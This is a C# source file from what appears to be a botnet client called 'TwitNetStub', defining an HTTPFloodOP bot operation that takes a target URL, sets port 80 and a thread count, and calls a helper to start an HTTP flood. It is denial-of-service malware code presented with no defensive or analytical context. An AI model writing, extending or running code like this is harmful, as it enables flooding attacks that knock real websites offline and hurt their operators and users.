using TwitNetStub.Util.Network;

namespace TwitNetStub.Operations
{
    class HTTPFloodOP : IBotOperation
    {
        public bool Finished { get; set; }
        private string MainURL;
        private int Port;
        private int Threads;

        public HTTPFloodOP (string url)
        {
            MainURL = url;
        }

        public void Initialize()
        {
           Port = 80;
           Threads = 1; 
        }
        public void Run()
        {
            Http.SfHost = MainURL;
            Http.Port = Port;
            Http.Threads = Threads;
            Http.StartHTTPFlood();
            //Finished = true;
        }
    }
}
